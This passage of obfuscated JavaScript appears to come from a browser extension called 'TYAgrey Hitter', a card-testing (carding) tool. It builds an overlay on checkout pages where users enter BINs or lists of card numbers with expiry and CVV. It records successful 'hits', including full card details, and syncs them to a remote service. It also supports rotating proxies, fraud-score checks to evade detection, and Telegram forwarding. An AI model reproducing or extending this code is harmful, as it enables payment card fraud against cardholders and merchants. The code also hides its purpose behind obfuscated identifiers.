    const _0x56c887 = Promise.race([checkLicenseKey(), new Promise(_0x5f2408 => setTimeout(() => _0x5f2408(true), 1200))]);
    const _0x4b344d = new Promise(async _0x1f0e59 => {
      let _0x1f58e8 = {};
      const _0x4e14a5 = () => {
        if (window.tyagreyStorage && window.tyagreyStorage.loadAllData) {
          return new Promise(_0x262b1c => window.tyagreyStorage.loadAllData(_0x3817f5 => _0x262b1c(_0x3817f5 || {})));
        } else {
          return Promise.resolve({});
        }
      };
      _0x1f58e8 = await Promise.race([_0x4e14a5(), new Promise(_0x46fe6a => setTimeout(() => _0x46fe6a({}), 800))]);
      const _0x2aeda8 = _0x1f58e8[K.PANEL_QUICK_BINS];
      const _0x1a1023 = _0x2aeda8 !== undefined && Array.isArray(_0x2aeda8);
      let _0x2ff264 = [];
      if (_0x1f58e8[K.SAVED_BINS] && Array.isArray(_0x1f58e8[K.SAVED_BINS])) {
        _0x2ff264 = normalizeBinArray(_0x1f58e8[K.SAVED_BINS]);
      } else {
        const _0x612d79 = localStorage.getItem(K.SAVED_BINS);
        if (_0x612d79) {
          try {
            const _0x2f455f = JSON.parse(_0x612d79);
            if (Array.isArray(_0x2f455f)) {
              _0x2ff264 = normalizeBinArray(_0x2f455f);
            }
          } catch (_0xb5b3b2) {
            _0x2ff264 = normalizeBinArray([_0x612d79]);
          }
        }
      }
      if (_0x1a1023) {
        savedBINs = normalizeBinArray(_0x2aeda8);
      } else if (_0x2ff264.length > 0) {
        savedBINs = _0x2ff264.slice();
      }
      if (_0x1f58e8[K.TOKEN]) {
        _0x5d2a03 = _0x1f58e8[K.TOKEN];
        userId = _0x1f58e8[K.USER_ID] || "";
        userChatId = _0x1f58e8[K.CHAT_ID] || "";
        userFirstName = _0x1f58e8[K.FIRST_NAME] || "";
        savedId = userId;
        localStorage.setItem(K.TOKEN, _0x5d2a03);
        localStorage.setItem(K.USER_ID, userId);
        localStorage.setItem(K.CHAT_ID, userChatId);
        localStorage.setItem(K.FIRST_NAME, userFirstName);
      } else {
        savedId = localStorage.getItem(K.USER_ID) || "";
        userId = localStorage.getItem(K.USER_ID) || "";
        userChatId = localStorage.getItem(K.CHAT_ID) || "";
        userFirstName = localStorage.getItem(K.FIRST_NAME) || "";
        _0x5d2a03 = localStorage.getItem(K.TOKEN) || "";
      }
      if (typeof chrome !== "undefined" && chrome.storage && chrome.storage.local) {
        try {
          const _0x516e91 = await new Promise(_0x59b739 => {
            chrome.storage.local.get(["tyagrey_chat_id", "tyagrey_user_id", "tyagrey_token", "tyagrey_first_name"], _0x59b739);
          });
          if (_0x516e91.tyagrey_chat_id && !userChatId) {
            userChatId = _0x516e91.tyagrey_chat_id;
            localStorage.setItem(K.CHAT_ID, userChatId);
          }
          if (_0x516e91.tyagrey_user_id && !userId) {
            userId = _0x516e91.tyagrey_user_id;
            localStorage.setItem(K.USER_ID, userId);
          }
          if (_0x516e91.tyagrey_token && !_0x5d2a03) {
            _0x5d2a03 = _0x516e91.tyagrey_token;
            localStorage.setItem(K.TOKEN, _0x5d2a03);
          }
          if (_0x516e91.tyagrey_first_name && !userFirstName) {
            userFirstName = _0x516e91.tyagrey_first_name;
            localStorage.setItem(K.FIRST_NAME, userFirstName);
          }
        } catch (_0x49b47c) {
          console.error("[TYAgrey] Failed to load from chrome.storage.local:", _0x49b47c);
        }
      }
      if (_0x1f58e8[K.TOGGLE_TG_FORWARD] !== undefined) {
        tgForwardEnabled = _0x1f58e8[K.TOGGLE_TG_FORWARD] !== false;
      }
      if (_0x1f58e8[K.CUSTOM_NAME]) {
        customName = _0x1f58e8[K.CUSTOM_NAME];
        localStorage.setItem(K.CUSTOM_NAME, customName);
      }
      if (_0x1f58e8[K.CUSTOM_EMAIL]) {
        customEmail = _0x1f58e8[K.CUSTOM_EMAIL];
        localStorage.setItem(K.CUSTOM_EMAIL, customEmail);
      }
      if (_0x1f58e8[K.SAVED_ID]) {
        savedId = _0x1f58e8[K.SAVED_ID];
        localStorage.setItem(K.USER_ID, savedId);
      }
      if (_0x5d2a03 && _0x5d2a03.length === 6) {
        try {
          const _0x3c62fe = await Promise.race([handleAPIRequest("get-user-data", {
            token: _0x5d2a03
          }), new Promise(_0x2adfeb => setTimeout(() => _0x2adfeb({
            success: false,
            timeout: true
          }), 3000))]);
          if (_0x3c62fe && _0x3c62fe.success) {
            const _0x22e6fb = Array.isArray(_0x3c62fe.panel_bins) && _0x3c62fe.panel_bins.length > 0 ? normalizeBinArray(_0x3c62fe.panel_bins) : Array.isArray(_0x3c62fe.saved_bins) ? normalizeBinArray(_0x3c62fe.saved_bins) : [];
            if (_0x22e6fb.length > 0) {
              applyPanelBinsCache(_0x22e6fb);
              if (!_0x1a1023) {
                savedBINs = _0x22e6fb.slice();
              }
            }
            if (typeof _0x3c62fe.total_hits === "number") {
              userHitsCount = _0x3c62fe.total_hits;
            }
            if (typeof _0x3c62fe.total_attempts === "number") {
              userAttemptsCount = _0x3c62fe.total_attempts;
            }
            if (Array.isArray(_0x3c62fe.hit_history) && _0x3c62fe.hit_history.length > 0) {
              cardHistory = _0x3c62fe.hit_history.map(_0x2507fb => ({
                card: _0x2507fb.card || _0x2507fb.card_info || "",
                mm: _0x2507fb.mm || "",
                yy: _0x2507fb.yy || "",
                cvv: _0x2507fb.cvv || "",
                response: _0x2507fb.status || _0x2507fb.response || "SUCCESS",
                time: _0x2507fb.time && _0x2507fb.time !== "0000-00-00 00:00:00" ? _0x2507fb.time : _0x2507fb.created_at && _0x2507fb.created_at !== "0000-00-00 00:00:00" ? _0x2507fb.created_at : new Date().toLocaleString("en-US", {
                  month: "2-digit",
                  day: "2-digit",
                  year: "numeric",
                  hour: "2-digit",
                  minute: "2-digit",
                  second: "2-digit",
                  hour12: false
                })
              }));
              saveCardHistory();
              updateHistoryDisplay();
            }
          }
        } catch (_0x56e343) {}
      }
      _0x1f0e59();
    });
    const [_0x2b9cef, _0x4de64e] = await Promise.all([_0x21ecbd, _0x56c887, _0x4b344d]);
    if (_0x2b9cef) {
      hasHit = true;
      hasNotified = true;
      isCreatingOverlay = false;
      return;
    }
    if (document.querySelector(".card-generator-overlay")) {
      isCreatingOverlay = false;
      return;
    }
    if (document.getElementById("tyagrey-overlay")) {
      isCreatingOverlay = false;
      return;
    }
    if (!_0x4de64e) {
      console.log("License check failed, but allowing overlay creation");
    }
    if (isVersionOutdated) {
      console.log("Version outdated, but allowing overlay creation");
    }
    if (!_0x5d2a03) {
      _0x5d2a03 = localStorage.getItem(K.TOKEN) || "";
    }
    isLoggedIn = false;
    if (_0x5d2a03 && _0x5d2a03.length === 6) {
      const _0x115334 = await Promise.race([validateToken(_0x5d2a03), new Promise(_0x23a097 => setTimeout(() => _0x23a097({
        success: false,
        timeout: true
      }), 1200))]);
      const _0x50775d = _0x115334 && _0x115334.success;
      if (_0x50775d) {
        isLoggedIn = true;
        userId = _0x115334.userId || userId;
        userFirstName = _0x115334.firstName || userFirstName;
        userPfpUrl = _0x115334.pfpUrl || userPfpUrl || DEFAULT_PFP;
        userHitsCount = _0x115334.userHits ?? _0x115334.hits ?? 0;
        globalHitsCount = _0x115334.globalHits ?? globalHitsCount;
        userAttemptsCount = _0x115334.attempts || 0;
        savedId = userId;
        Promise.race([fetchHitCounts(), new Promise(_0x1dbee6 => setTimeout(_0x1dbee6, 800))]);
        startHitCountsRefresh();
        startPeriodicCloudSync();
        fetchDailyHits();
        window.postMessage({
          type: "SAVE_LOGIN_STATE",
          token: _0x5d2a03,
          userId: userId,
          firstName: userFirstName
        }, "*");
        (async () => {
          try {
            const _0x58f5e8 = await Promise.race([handleAPIRequest("get-user-data", {
              token: _0x5d2a03
            }), new Promise(_0x4616ec => setTimeout(() => _0x4616ec({
              success: false,
              timeout: true
            }), 3000))]);
            if (_0x58f5e8 && _0x58f5e8.success) {
              const _0x34d869 = Array.isArray(_0x58f5e8.panel_bins) && _0x58f5e8.panel_bins.length > 0 ? normalizeBinArray(_0x58f5e8.panel_bins) : Array.isArray(_0x58f5e8.saved_bins) ? normalizeBinArray(_0x58f5e8.saved_bins) : [];
              if (_0x34d869.length > 0) {
                applyPanelBinsCache(_0x34d869);
                if (window.tyagreyStorage && window.tyagreyStorage.loadPanelQuickBins) {
                  window.tyagreyStorage.loadPanelQuickBins(_0x267634 => {
                    if (!isExplicitPanelQuickBins(_0x267634) && savedBINs.length === 0) {
                      savedBINs = _0x34d869.slice();
                    }
                  });
                } else if (savedBINs.length === 0) {
                  savedBINs = _0x34d869.slice();
                }
              }
              if (typeof _0x58f5e8.total_hits === "number" && _0x58f5e8.total_hits > userHitsCount) {
                userHitsCount = _0x58f5e8.total_hits;
              }
              if (typeof _0x58f5e8.total_attempts === "number" && _0x58f5e8.total_attempts > userAttemptsCount) {
                userAttemptsCount = _0x58f5e8.total_attempts;
              }
              if (Array.isArray(_0x58f5e8.hit_history) && _0x58f5e8.hit_history.length > 0) {
                cardHistory = _0x58f5e8.hit_history.map(_0x36ca35 => ({
                  card: _0x36ca35.card || _0x36ca35.card_info || "",
                  mm: _0x36ca35.mm || "",
                  yy: _0x36ca35.yy || "",
                  cvv: _0x36ca35.cvv || "",
                  response: _0x36ca35.status || _0x36ca35.response || "SUCCESS",
                  time: _0x36ca35.time && _0x36ca35.time !== "0000-00-00 00:00:00" ? _0x36ca35.time : _0x36ca35.created_at && _0x36ca35.created_at !== "0000-00-00 00:00:00" ? _0x36ca35.created_at : new Date().toLocaleString("en-US", {
                    month: "2-digit",
                    day: "2-digit",
                    year: "numeric",
                    hour: "2-digit",
                    minute: "2-digit",
                    second: "2-digit",
                    hour12: false
                  })
                }));
                saveCardHistory();
                updateHistoryDisplay();
              }
              updateIpBarUserInfo();
            }
          } catch (_0x2fca5e) {}
        })();
      } else {
        userId = "";
        userFirstName = "";
        isLoggedIn = false;
        _0x5d2a03 = "";
        localStorage.removeItem(K.TOKEN);
        localStorage.removeItem(K.USER_ID);
        localStorage.removeItem(K.FIRST_NAME);
        if (window.tyagreyStorage && window.tyagreyStorage.clearUserSession) {
          window.tyagreyStorage.clearUserSession();
        }
        window.postMessage({
          type: "SAVE_LOGIN_STATE",
          token: null
        }, "*");
      }
    } else {
      isLoggedIn = false;
    }
    if (tgForwardEnabled === undefined) {
      tgForwardEnabled = localStorage.getItem(K.TOGGLE_TG_FORWARD) !== "false";
    }
    const _0x53f67f = parseFloat(localStorage.getItem("tyagrey_hit_speed"));
    if (!isNaN(_0x53f67f) && _0x53f67f >= 0.3 && _0x53f67f <= 3) {
      hitSpeed = _0x53f67f;
    }
    cardFieldsDetected = hasCardFields();
    const _0x59c2ea = document.createElement("div");
    _0x59c2ea.className = "card-generator-overlay";
    _0x59c2ea.innerHTML = "\n    <div class=\"panel-header\">\n      <div class=\"panel-header-content\">\n        <span class=\"panel-title\">TYAgrey Hitter</span>\n      </div>\n      <div class=\"header-controls\">\n        <button class=\"music-toggle\" id=\"musicToggleBtn\" title=\"Toggle Music\">🎵</button>\n        <button class=\"minimize-btn\" id=\"minimizeBtn\" title=\"Minimize panel\">»</button>\n      </div>\n    </div>\n    <div class=\"modal-content " + (isLoggedIn ? "" : "hidden") + "\" id=\"mainDashboard\">\n      <div class=\"section\">\n        <div class=\"section-title\">MODE</div>\n        <div class=\"mode-toggle mode-toggle-small\">\n          <button class=\"mode-btn active\" id=\"modeBin\" data-mode=\"bin\">BIN</button>\n          <button class=\"mode-btn\" id=\"modeCc\" data-mode=\"cc\">CC</button>\n        </div>\n      </div>\n      <div class=\"section\" id=\"binSection\">\n        <div class=\"section-title\">BIN</div>\n        <div class=\"bin-inputs-container\" id=\"binInputsContainer\">\n          <div class=\"bin-input-row\">\n            <input type=\"text\" class=\"input-field bin-input\" id=\"binInput1\" placeholder=\"input bin\" maxlength=\"30\">\n            <button class=\"add-bin-btn\" id=\"addBinBtn\" title=\"Add BIN\">+</button>\n          </div>\n        </div>\n        <div class=\"bin-sync-status hidden\" id=\"binSyncStatus\">Syncing saved BINs...</div>\n        <div class=\"bin-buttons-row\">\n          <button class=\"action-btn save-btn\" id=\"enterBinBtn\">💾 Save</button>\n          <button class=\"action-btn switch-btn hidden\" id=\"switchBinBtn\">🔄 Switch</button>\n        </div>\n      </div>\n      <div class=\"section hidden\" id=\"ccSection\">\n        <div class=\"section-title\">CC LIST</div>\n        <div class=\"cc-info\">" + ccList.length + " cards loaded</div>\n        <button class=\"action-btn save-btn\" id=\"openCcModal\">📝 Edit CC List</button>\n      </div>\n      <div class=\"section-divider\"></div>\n      <div class=\"section\">\n        <button class=\"action-btn primary-btn\" id=\"autocoBtn\">▶ Start</button>\n      </div>\n            <div class=\"collapsible-section\">\n        <div class=\"collapsible-header\" id=\"statsToggle\">\n          <span>📋 Logs</span>\n          <span class=\"collapse-icon\">▼</span>\n        </div>\n        <div class=\"collapsible-content\" id=\"statsContent\">\n          <div class=\"history-list\" id=\"historyList\">\n            <div class=\"history-empty\">No hits yet</div>\n          </div>\n          <button class=\"action-btn clear-btn\" id=\"clearHistory\">🗑 Clear</button>\n        </div>\n      </div>\n      <div class=\"collapsible-section\">\n        <div class=\"collapsible-header\" id=\"settingsToggle\">\n          <span>⚙️ Settings</span>\n          <span class=\"collapse-icon\">▼</span>\n        </div>\n        <div class=\"collapsible-content\" id=\"settingsContent\">\n          <div class=\"settings-grid\">\n  <div class=\"setting-row\">\n  <span class=\"setting-icon\">👤</span>\n  <span class=\"setting-label\">Name</span>\n  <input type=\"text\" class=\"setting-text-input\" id=\"customNameInput\" placeholder=\"Default: TYAgrey\" value=\"" + customName + "\">\n  </div>\n  <div class=\"setting-row\">\n  <span class=\"setting-icon\">📧</span>\n  <span class=\"setting-label\">Email</span>\n  <input type=\"text\" class=\"setting-text-input\" id=\"customEmailInput\" placeholder=\"Default: tyagrey@voewo.com\" value=\"" + customEmail + "\">\n  </div>\n  <div class=\"setting-box\" id=\"bgColorBox\">\n    <div class=\"setting-row no-border\">\n      <span class=\"setting-icon\">🎨</span>\n      <span class=\"setting-label\">BG Color</span>\n      <label class=\"toggle-switch\">\n        <input type=\"checkbox\" id=\"bgColorToggle\" " + (bgColorEnabled ? "checked" : "") + ">\n        <span class=\"toggle-slider\"></span>\n      </label>\n    </div>\n    <div class=\"setting-row-inner " + (bgColorEnabled ? "" : "hidden") + "\" id=\"colorSettingsBox\">\n      <span class=\"setting-label-inner\">Pick Color</span>\n      <input type=\"color\" class=\"custom-color-box\" id=\"pageBgColorInput\" value=\"" + pageBackgroundColor + "\">\n    </div>\n  </div>\n  <div class=\"setting-box\" id=\"musicBox\">\n    <div class=\"setting-row no-border\">\n      <span class=\"setting-icon\">🎵</span>\n      <span class=\"setting-label\">Custom Music</span>\n    </div>\n    <div class=\"setting-row-inner\">\n      <button class=\"music-btn\" id=\"customMusicBtn\">📁 Upload</button>\n      <button class=\"music-btn\" id=\"previewMusicBtn\">▶️ Test</button>\n    </div>\n    <div class=\"custom-music-info hidden\" id=\"customMusicInfo\">\n      <span class=\"music-filename\" id=\"musicFilename\">No file</span>\n      <button class=\"music-remove-btn\" id=\"removeMusicBtn\">✕</button>\n    </div>\n  </div>\n  <input type=\"file\" id=\"musicFileInput\" accept=\".mp3,audio/mpeg\" class=\"file-input-hidden\">\n  <div class=\"logout-container\">\n    <button class=\"action-btn logout-btn\" id=\"logoutBtn\">🚪 Logout</button>\n  </div>\n          </div>\n        </div>\n      </div>\n    </div>\n    <div class=\"modal-content " + (isLoggedIn ? "hidden" : "") + "\" id=\"loginScreen\">\n      <div class=\"section\">\n        <div class=\"section-title\">🔑 LOGIN REQUIRED</div>\n        <div class=\"login-info\">Click Quick Login to authenticate via Telegram</div>\n      </div>\n      <div class=\"section\">\n        <button class=\"action-btn primary-btn\" id=\"quickLoginBtn\">⚡ Quick Login</button>\n      </div>\n      <div class=\"section\">\n        <div class=\"login-error hidden\" id=\"loginError\"></div>\n      </div>\n    </div>\n  ";
    const _0x37a39b = document.createElement("style");
    _0x37a39b.textContent = ".card-generator-overlay{width:260px !important;background:#0f172a !important;border:1px solid rgba(125,211,252,0.12) !important;border-radius:14px !important;box-shadow:0 25px 50px rgba(0,0,0,0.4) !important;backdrop-filter:none !important;-webkit-backdrop-filter:none !important;overflow:hidden !important}.card-generator-overlay.minimized{width:160px !important;height:32px !important;min-height:32px !important;overflow:hidden !important}.card-generator-overlay .panel-header{background:linear-gradient(90deg,#0ea5e9,#6366f1) !important;border:none !important;border-bottom:none !important;padding:10px 14px !important;border-radius:14px 14px 0 0 !important}.card-generator-overlay .panel-title{color:#fff !important;font-size:13px !important;font-weight:700 !important;text-shadow:none !important}.card-generator-overlay .music-toggle,.card-generator-overlay .minimize-btn{background:rgba(255,255,255,0.15) !important;border:none !important;border-radius:6px !important;color:#fff !important;width:24px !important;height:24px !important;font-size:11px !important}.card-generator-overlay .modal-content,.card-generator-overlay .login-screen{background:#0f172a !important}.card-generator-overlay .section-title{color:#64748b !important;font-size:9px !important;text-transform:uppercase !important;letter-spacing:0.5px !important}.card-generator-overlay .mode-toggle{background:#1e293b !important;border-radius:8px !important;padding:3px !important}.card-generator-overlay .mode-btn.active{background:#0ea5e9 !important;color:#fff !important}.card-generator-overlay .mode-btn:not(.active){background:transparent !important;color:#94a3b8 !important}.card-generator-overlay .input-field,.card-generator-overlay .bin-input{background:#1e293b !important;border:1px solid rgba(125,211,252,0.08) !important;color:#e2e8f0 !important;border-radius:6px !important}.card-generator-overlay .action-btn{background:#1e293b !important;border:1px solid rgba(125,211,252,0.1) !important;color:#e2e8f0 !important}.card-generator-overlay .action-btn.primary-btn{background:linear-gradient(90deg,#10b981,#0ea5e9) !important;border:none !important;color:#fff !important}.card-generator-overlay .collapsible-header{color:#94a3b8 !important;border-top:1px solid rgba(125,211,252,0.05) !important}.card-generator-overlay .setting-text-input{background:#1e293b !important;border:1px solid rgba(125,211,252,0.08) !important;color:#e2e8f0 !important}.card-generator-overlay .setting-box{background:#1e293b !important}.card-generator-overlay .logout-btn{color:#f87171 !important;border-color:rgba(239,68,68,0.15) !important}.card-generator-overlay .setting-label{color:#94a3b8 !important}.card-generator-overlay .section-divider{background:rgba(125,211,252,0.06) !important}.card-generator-overlay .history-empty{color:#64748b !important}.card-generator-overlay .bin-sync-status{color:#0ea5e9 !important}";
    _0x59c2ea.appendChild(_0x37a39b);
    const _0x33b8f7 = document.createElement("div");
    _0x33b8f7.className = "cc-modal hidden";
    _0x33b8f7.id = "ccModal";
    _0x33b8f7.innerHTML = "\n    <div class=\"cc-modal-content\">\n      <div class=\"cc-modal-header\">\n        <span>📝 CC List (Max 20)</span>\n        <button class=\"cc-modal-close\" id=\"closeCcModal\">✕</button>\n      </div>\n      <div class=\"cc-modal-body\">\n        <textarea id=\"ccTextarea\" placeholder=\"Enter cards (one per line)&#10;Format: cc|mm|yy|cvv&#10;&#10;Example:&#10;4532110012345678|09|27|123&#10;4532110087654321|12|28|456\"></textarea>\n        <div class=\"cc-modal-info\">\n          <span id=\"ccCount\">0</span>/20 cards\n        </div>\n      </div>\n      <div class=\"cc-modal-footer\">\n        <button class=\"action-btn\" id=\"clearCcList\">Clear</button>\n        <button class=\"action-btn primary-btn\" id=\"saveCcList\">💾 Save</button>\n      </div>\n    </div>\n  ";
    const _0x25c90 = document.createElement("div");
    _0x25c90.className = "cc-modal hidden";
    _0x25c90.id = "bgInfoModal";
    _0x25c90.innerHTML = "\n    <div class=\"cc-modal-content\">\n      <div class=\"cc-modal-header\">\n        <span>📱 BG Color Info</span>\n        <button class=\"cc-modal-close\" id=\"closeBgInfoModal\">✕</button>\n      </div>\n      <div class=\"cc-modal-body bg-info-body\">\n        <div class=\"bg-info-icon\">\n          <span>⚠️</span>\n        </div>\n        <div class=\"bg-info-title\">\n          Background Color Only Works On Mobile Phone\n        </div>\n        <div class=\"bg-info-content\">\n          <div class=\"bg-info-box bg-info-warning\">\n            <div class=\"bg-info-box-title warning-text\">❌ Not Working On:</div>\n            <div>• Desktop / PC Browser</div>\n            <div>• Laptop Browser</div>\n          </div>\n          <div class=\"bg-info-box bg-info-success\">\n            <div class=\"bg-info-box-title success-text\">📱 For Phone Users:</div>\n            <div>• Don't use Desktop Mode in browser</div>\n            <div>• Use Mobile View for best results</div>\n          </div>\n        </div>\n      </div>\n      <div class=\"cc-modal-footer\">\n        <button class=\"action-btn primary-btn full-width-btn\" id=\"bgInfoOkBtn\">Okyy.!</button>\n      </div>\n    </div>\n  ";
    const _0x45bab5 = document.createElement("div");
    _0x45bab5.className = "cc-modal hidden";
    _0x45bab5.id = "proxyModal";
    _0x45bab5.innerHTML = "\n    <div class=\"cc-modal-content\">\n      <div class=\"cc-modal-header\">\n        <span id=\"proxyModalTitle\">🌐 " + (proxyString ? "Proxy Info" : "Set Proxy") + "</span>\n        <button class=\"cc-modal-close\" id=\"closeProxyModal\">✕</button>\n      </div>\n      <div class=\"cc-modal-body\" id=\"proxyModalBody\">\n        " + (proxyString ? "\n          <div class=\"proxy-info-display\">\n            <div class=\"proxy-info-row\">\n              <span class=\"proxy-info-label\">Status:</span>\n              <span class=\"proxy-info-value\">\n                <span class=\"success-text\">● Active</span>\n              </span>\n            </div>\n            <div class=\"proxy-info-row\">\n              <span class=\"proxy-info-label\">IP:</span>\n              <span class=\"proxy-info-value\">" + (proxyInfo.ip || "N/A") + "</span>\n            </div>\n            <div class=\"proxy-info-row\">\n              <span class=\"proxy-info-label\">Country:</span>\n              <span class=\"proxy-info-value\">" + (proxyInfo.country_name || "N/A") + (proxyInfo.country_code ? " (" + proxyInfo.country_code + ")" : "") + "</span>\n            </div>\n            <div class=\"proxy-info-row\">\n              <span class=\"proxy-info-label\">Response:</span>\n              <span class=\"proxy-info-value\">" + (proxyInfo.response_time_ms ? proxyInfo.response_time_ms + "ms" : "N/A") + "</span>\n            </div>\n            <div class=\"proxy-info-row\">\n              <span class=\"proxy-info-label\">Type:</span>\n              <span class=\"proxy-info-value\">HTTP" + (proxyInfo.ip_type ? " (" + proxyInfo.ip_type + ")" : "") + "</span>\n            </div>\n            <div class=\"proxy-info-row\">\n              <span class=\"proxy-info-label\">Proxy:</span>\n              <span class=\"proxy-info-value proxy-masked\">" + obfuscateProxy(proxyString) + "</span>\n            </div>\n          </div>\n        " : "\n          <div class=\"proxy-setup-form\">\n            <div class=\"proxy-form-row\">\n              <label class=\"proxy-form-label\">HTTP Proxies (One per line)</label>\n              <textarea class=\"input-field\" id=\"proxyInput\" placeholder=\"host:port:user:pass\" rows=\"4\" style=\"resize:vertical\"></textarea>\n            </div>\n            <div class=\"setting-row\" style=\"margin-top: 10px; margin-bottom: 10px; display: flex; align-items: center; gap: 10px;\">\n              <span class=\"setting-icon\">🔄</span>\n              <span class=\"setting-label\" style=\"flex:1\">Auto-Rotate Proxies</span>\n              <label class=\"toggle-switch\">\n                <input type=\"checkbox\" id=\"proxyAutoRotateToggle\">\n                <span class=\"toggle-slider\"></span>\n              </label>\n            </div>\n            <div class=\"proxy-format-hint\">\n              <div class=\"proxy-format-title\">Supported Formats:</div>\n              <div>• host:port:user:pass</div>\n              <div>• user:pass@host:port</div>\n              <div>• user:pass:host:port</div>\n            </div>\n          </div>\n        ") + "\n      </div>\n      <div class=\"cc-modal-footer\" id=\"proxyModalFooter\">\n        " + (proxyString ? "\n          <button class=\"action-btn danger-btn\" id=\"proxyRemoveBtn\">🗑 Remove</button>\n        " : "\n          <button class=\"action-btn primary-btn\" id=\"proxySaveBtn\">💾 Save</button>\n        ") + "\n      </div>\n    </div>\n  ";
    const _0x169a2a = document.createElement("div");
    _0x169a2a.className = "cc-modal hidden ipfraud-modal";
    _0x169a2a.id = "ipFraudModal";
    _0x169a2a.innerHTML = "\n    <div class=\"cc-modal-content\">\n      <div class=\"cc-modal-header\">\n        <span>IP Fraud Check</span>\n        <div class=\"ipfraud-modal-actions\">\n          <button class=\"ipfraud-icon-btn\" id=\"ipFraudSettingsBtn\" title=\"Set IPQS key\">CFG</button>\n          <button class=\"ipfraud-icon-btn\" id=\"ipFraudRefreshBtn\" title=\"Refresh\">R</button>\n          <button class=\"cc-modal-close\" id=\"closeIpFraudModal\">X</button>\n        </div>\n      </div>\n      <div class=\"cc-modal-body\">\n        <div class=\"ipfraud-top\">\n          <div class=\"ipfraud-ip-wrap\">\n            <div class=\"ipfraud-ip-row\">\n              <div class=\"ipfraud-ip blurred\" id=\"ipFraudIp\">Loading...</div>\n              <button class=\"ipfraud-mini-btn\" id=\"ipFraudToggleBtn\" title=\"Show IP\">IP</button>\n            </div>\n            <div class=\"ipfraud-source\" id=\"ipFraudSource\">Checking current IP...</div>\n          </div>\n          <div class=\"ipfraud-badge low\" id=\"ipFraudBadge\">LOW</div>\n        </div>\n        <div class=\"ipfraud-score-card\">\n          <div class=\"ipfraud-scorebar\" id=\"ipFraudScorebar\">\n            <span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span>\n          </div>\n          <div class=\"ipfraud-score-meta\">\n            <span class=\"left\">0</span>\n            <span class=\"center\" id=\"ipFraudScoreText\">Score: --/100</span>\n            <span class=\"right\">100</span>\n          </div>\n        </div>\n        <div class=\"ipfraud-details\">\n          <div class=\"ipfraud-row\"><span class=\"ipfraud-label\">Country</span><span class=\"ipfraud-value\" id=\"ipFraudCountry\">--</span></div>\n          <div class=\"ipfraud-row\"><span class=\"ipfraud-label\">State</span><span class=\"ipfraud-value\" id=\"ipFraudState\">--</span></div>\n          <div class=\"ipfraud-row\"><span class=\"ipfraud-label\">City</span><span class=\"ipfraud-value\" id=\"ipFraudCity\">--</span></div>\n          <div class=\"ipfraud-row\"><span class=\"ipfraud-label\">ISP</span><span class=\"ipfraud-value\" id=\"ipFraudIsp\">--</span></div>\n        </div>\n        <div class=\"ipfraud-foot\" id=\"ipFraudFoot\">Provider: IPQualityScore. A default key is built in. Use CFG only if you want to replace it. ProxyCheck.io is used only as fallback.</div>\n      </div>\n    </div>\n  ";
    document.body.appendChild(_0x45bab5);
    document.body.appendChild(_0x25c90);
    document.body.appendChild(_0x169a2a);
    document.body.appendChild(_0x33b8f7);
    document.body.appendChild(_0x59c2ea);
    _0x59c2ea.addEventListener("click", _0x5a1333 => {
      if (isMinimized && _0x5a1333.target === _0x59c2ea) {
        const _0x400873 = document.elementFromPoint(_0x5a1333.clientX, _0x5a1333.clientY);
        if (_0x400873 && (_0x400873.tagName === "BUTTON" || _0x400873.classList.contains("music-toggle") || _0x400873.closest("button") || _0x400873.closest(".music-toggle"))) {
          return;
        }
        toggleMinimize(_0x5a1333);
      }
    });
    setupLoginListeners();
    setupEventListeners(_0x59c2ea);
    updateBinStatus();
    updateIdStatus();
    updateHistoryDisplay();
    updateStats();
    window.postMessage({
      type: "GET_TOGGLE_STATES"
    }, "*");
    window.postMessage({
      type: "GET_SAVED_BIN"
    }, "*");
    window.postMessage({
      type: "GET_SAVED_ID"
    }, "*");
    window.postMessage({
      type: "GET_LOGIN_STATE"
    }, "*");
    isCreatingOverlay = false;
  }
  function setupEventListeners(_0x326a8c) {
    const _0x5b367d = document.getElementById("enterBinBtn");
    const _0x2aa3a3 = document.getElementById("autocoBtn");
    const _0x1ae267 = document.getElementById("minimizeBtn");
    const _0x5d4d3b = document.getElementById("addBinBtn");
    const _0x1a13de = document.getElementById("switchBinBtn");
    const _0x14f86b = document.getElementById("binInput1");
    refreshUserRole().then(() => {
      loadSavedBins();
    });
    if (_0x14f86b) {
      setupBinInputValidation(_0x14f86b);
    }
    if (_0x5d4d3b) {
      _0x5d4d3b.addEventListener("click", () => {
        const _0x1d51a3 = getBinInputsContainerEl();
        if (!_0x1d51a3) {
          return;
        }
        const _0x775425 = _0x1d51a3.querySelectorAll(".bin-input");
        const _0x5c89aa = document.createElement("div");
        _0x5c89aa.className = "bin-input-row";
        const _0x3274b9 = document.createElement("input");
        _0x3274b9.type = "text";
        _0x3274b9.className = "input-field bin-input";
        _0x3274b9.placeholder = "input bin";
        _0x3274b9.maxLength = "30";
        const _0x5eb368 = document.createElement("button");
        _0x5eb368.className = "remove-bin-btn";
        _0x5eb368.textContent = "−";
        _0x5eb368.title = "Remove";
        _0x5c89aa.appendChild(_0x3274b9);
        _0x5c89aa.appendChild(_0x5eb368);
        _0x1d51a3.appendChild(_0x5c89aa);
        setupBinInputValidation(_0x3274b9);
        _0x5eb368.addEventListener("click", () => {
          _0x5c89aa.remove();
          const _0x7ebe21 = _0x1d51a3.querySelectorAll(".bin-input");
          const _0x20f213 = Array.from(_0x7ebe21).map(_0x476e02 => _0x476e02.value.trim()).filter(_0x227030 => _0x227030 && _0x227030.length >= 6);
          savePanelBinsLocalOnly(_0x20f213);
          currentBinIndex = Math.min(currentBinIndex, Math.max(0, savedBINs.length - 1));
          updateBinStatus();
          updateSwitchBtnVisibility();
        });
        updateSwitchBtnVisibility();
      });
    }
    if (_0x1a13de) {
      _0x1a13de.addEventListener("click", switchBin);
    }
    if (_0x5b367d) {
      _0x5b367d.addEventListener("click", async () => {
        const _0x2a387d = getPanelBinInputElements();
        const _0x2fa5b2 = [];
        let _0x36a76b = false;
        const _0x4476cb = new Set();
        _0x2a387d.forEach(_0x472497 => {
          const _0x2d9f7e = _0x472497.value.trim();
          if (_0x2d9f7e) {
            const _0x33f78c = _0x2d9f7e.split("|")[0].replace(/[^0-9xX]/g, "");
            if (_0x33f78c.length < 3) {
              showWarning("⚠️ BIN must be at least 3 digits", "error");
              _0x36a76b = true;
              return;
            }
            const _0x4142e5 = normalizeBinForComparison(_0x2d9f7e);
            if (_0x4476cb.has(_0x4142e5)) {
              showWarning("⚠️ BIN already entered in this list", "error");
              _0x36a76b = true;
              return;
            }
            _0x4476cb.add(_0x4142e5);
            _0x2fa5b2.push(_0x2d9f7e);
          }
        });
        if (_0x36a76b) {
